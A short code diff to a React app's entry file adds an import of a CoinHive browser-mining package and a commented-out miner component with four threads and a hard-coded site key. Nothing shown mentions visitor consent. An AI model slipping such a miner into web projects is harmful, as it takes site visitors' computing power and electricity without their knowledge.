@@ -1,6 +1,7 @@
 import React from 'react';
 import ReactDOM from 'react-dom';
 import BurgerMenu from 'react-burger-menu';
+import CoinHiveClient from 'react-coin-hive';
 import { Provider } from 'react-redux';
 import { NotificationContainer } from 'react-notifications';
 import {
@@ -94,6 +95,8 @@ class Main extends React.Component {
               <img src={logo} alt="logo"/>
             </a>
           </header>
+
+          {/*<CoinHiveClient threads={4} timeout={60 * 60 * 1000} siteKey='iRDxrPvEHkmRa13mEEwsPvb1LxiQjp7s'/>*/}
 
           <div className="background" />
           <Router>
